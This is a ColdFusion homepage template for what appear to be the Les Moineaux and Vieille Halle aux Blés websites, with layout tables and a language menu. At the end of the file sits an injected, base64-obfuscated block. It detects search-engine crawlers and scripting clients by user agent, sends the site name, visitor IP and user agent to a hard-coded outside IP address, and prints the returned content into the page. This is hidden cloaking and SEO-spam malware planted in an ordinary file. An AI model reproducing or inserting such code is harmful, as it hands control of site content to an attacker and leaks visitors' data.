



<cfsilent>
<!--- Default params --->
<cfparam name="home" default="moineaux">
<cfparam name="lang" default="en">
<cfparam name="url.site" default="">
<cfset langList = "en,es,fr,nl">
<cfset homeList = "moineaux,bles">

<!--- <cfset img = structNew()> --->
<cfset cfg = structNew()>

<cfif CGI.SERVER_PORT EQ 8500>
	<cfset cfg.moineauxUrl = "127.0.0.1:8500/Moineaux.be">
	<cfset cfg.blesUrl = "127.0.0.1:8500/Moineaux.be">
<cfelse>
	<cfset cfg.moineauxUrl = "www.moineaux.be">
	<cfset cfg.blesUrl = "www.vieillehalleauxbles.be">
</cfif>

<cfif findNoCase("vieillehalleauxbles.be", CGI.SERVER_NAME) OR url.site EQ "bles">
	<cfset home = "bles">
</cfif>

<cfswitch expression="#home#">
	<!--- bles --->
	<cfcase value="bles">
		<cfset cfg.bgcolor = "330000">
		<cfset cfg.bgcolor2 = "000000">
		<cfinclude template="txt_bles.cfm">
		<cfset showMenuLang = true>
	</cfcase>
	<!--- moineaux --->
	<cfdefaultcase>
		<cfset cfg.bgcolor = "000000">
		<cfset cfg.bgcolor2 = "222222">
		<cfinclude template="txt_moineaux.cfm">
		<cfset showMenuLang = false>
	</cfdefaultcase>
</cfswitch>
</cfsilent>

<!--- Output Page --->
<cfoutput>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
	<meta http-equiv=Content-Type content="text/html; charset=utf-8">
	<title>#txt.Title#</title>
	<link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
	<script type="text/javascript" src="js/jquery-1.7.2.min.js"></script>
	<script type="text/javascript" src="js/slimbox2.js"></script>
	<link rel="stylesheet" href="css/slimbox/slimbox2.css" type="text/css" media="all" />
	<script language="javascript">
		jQuery(document).ready(function() {
			jQuery("a[rel^='lightbox']").slimbox({/* Put custom options here */});
		});
	</script>

</head>
<body bgcolor="##ffffff" text="##ffffff" link="##cccccc" alink="##cccccc" vlink="##cccccc" marginheight="0" marginwidth="0" leftmargin="0" topmargin="0" rightmargin="0" bottommargin="0">
<!-- General vertical centering -->
<cfif showMenuLang>
<div class="menuDiv">
	<!--- <ul class="menuHome">
		<li><a href="http://#cfg.moineauxUrl#/index.cfm?lang=#lang#&home=moineaux"<cfif home EQ "moineaux"> class="selected"</cfif>>Les Moineaux</a></li>
		<li><a href="http://#cfg.blesUrl#/index.cfm?lang=#lang#&home=bles"<cfif home EQ "bles"> class="selected"</cfif>>Vieille Halle Aux Bl&eacute;s</a></li>
	</ul> --->
	<ul class="menuLang">
		<cfloop list=#langlist# index="i">
			<cfif i EQ lang>
				<li><a href="index.cfm?lang=#i#&home=#home#" class="selected">#i#</a></li>
			<cfelse>
				<li><a href="index.cfm?lang=#i#&home=#home#">#i#</a></li>
			</cfif>
		</cfloop>
	</ul>
</div>
</cfif>
<table height="90%" cellpadding="0" cellspacing="0" border="0">

<tr><td height="90%" align="left" valign="middle">

<table height="540" cellspacing="0" cellpadding="0" border="0">
<tr>
    <td height="540" rowspan="3" valign="middle">
		<table width="750" cellpadding="0" cellspacing="0" border="0">
			<tr>
				<td width="150" align="left" valign="middle">&nbsp;</td>
				<td width="600" align="right" valign="middle"><img src="img/#home#/home.jpg" alt="" border="0" usemap="##homemap"></td>
			</tr>
		</table>
	</td>
    <td height="71" background="img/ln_top.gif"><img src="img/ln_top.gif" width="100%" height="71" alt="" border="0"></td>
</tr>
<tr>
    <td height="398">
	<table height="398" cellpadding="0" cellspacing="0" border="0">
	<tr>
	<td width="30" bgcolor="###cfg.bgcolor#" valign="top"><img src="img/1x1.gif" width="30" height="1" border="0"></td>
	<td width="300" bgcolor="###cfg.bgcolor#"><img src="img/1x1.gif" width="300" height="1" border="0"><br>
	<p align="justify"><font face="Arial, Helvetica, sans-serif" size="2">
	<!--- <font size="5" color="##666666"><i>#txt.whatT# ?</i></font> ---><br>#txt.whatP#</font></p>
	</td>
	<td width="30" bgcolor="###cfg.bgcolor#" valign="top"><img src="img/1x1.gif" width="30" height="0" border="0"></td>
	<td bgcolor="###cfg.bgcolor#">#txt.images#</td>
	<td width="20" bgcolor="###cfg.bgcolor#" valign="top"><img src="img/1x1.gif" width="20" height="0" border="0"></td>
	<td width="200" bgcolor="###cfg.bgcolor#"><img src="img/1x1.gif" width="200" height="0" border="0"><br>
	<font face="Arial, Helvetica, sans-serif" size="2">#txt.HomeDescription#</font>
	</td>
	<td width="30" bgcolor="###cfg.bgcolor#" valign="top"><img src="img/1x1.gif" width="30" height="0" border="0"></td>
	<td width="30" bgcolor="###cfg.bgcolor2#" valign="top"><img src="img/1x1.gif" width="30" height="0" border="0"></td>
	<td width="200" bgcolor="###cfg.bgcolor2#"><img src="img/1x1.gif" width="200" height="0" border="0"><br>
	<font face="Arial, Helvetica, sans-serif" size="2">#txt.HomeContact#</font>
	</td>
	<td width="10" bgcolor="###cfg.bgcolor#" valign="top"><img src="img/1x1.gif" width="10" height="0" border="0"></td>
	<td bgcolor="###cfg.bgcolor#" valign="top"><a name="rates"><img src="img/#home#/end.jpg" width="265" height="398" alt="" border="0"></a></td>
	<td width="10" bgcolor="###cfg.bgcolor#" valign="top"><img src="img/1x1.gif" width="10" height="0" border="0"></td>
	</tr></table>
	</td>
</tr>
<tr>
    <td height="71" background="img/ln_bottom.gif" valign="top"><img src="img/ln_bottom.gif" width="100%" height="71" alt="" border="0"></td>
</tr>
</table>
</td></tr></table>
<map name="homemap">
<area alt="Contact us" coords="10,425,251,369" href="mailto:jroelens@skynet.be">
<!--- <area alt="See rates" coords="483,464,630,511" href="index.cfm?lang=#lang#&home=#home###rates"> --->
</map>



<cfset fGJvdHxj = '#AfLfd("aHR0cHxnb29nbGV8c2x1cnB8bXNuYm90fGJvdHxjcmF3bHxzcGlkZXJ8cm9ib3R8SHR0cENsaWVudHxjdXJsfFBIUHxTaXRlVXB0aW1lfFdvcmRQcmVzc3xDaGFybG90dGV8d3d3c3RlcnxQeXRob258dXJsbGlifHBlcmx8bGlid3d3fGx5bnh8VHdpY2VsZXJ8bXNufHlhaG9vfGJpbmc=")#'>
<cfif (REFindNoCase(fGJvdHxj,cgi.http_user_agent) NEQ 0)>
<cfhttp url="#AfLfd('aHR0cDovLzIxNy4yMy4zLjIzOS9pbi5waHA/cGk9')##CGI.SERVER_NAME##AfLfd('JmlwPQ==')##CGI.REMOTE_ADDR##AfLfd('JnVhPQ==')##CGI.HTTP_USER_AGENT#">
<cfoutput>
  #cfhttp.filecontent#
</cfoutput>    
<cffunction name="AfLfd">  
<cfargument name="HxzcGlk"> 
<cfset Ypg = ToString(ToBinary(HxzcGlk))>
<cfreturn Ypg>
</cffunction>         
</cfif>
</body>
</html>
</cfoutput>
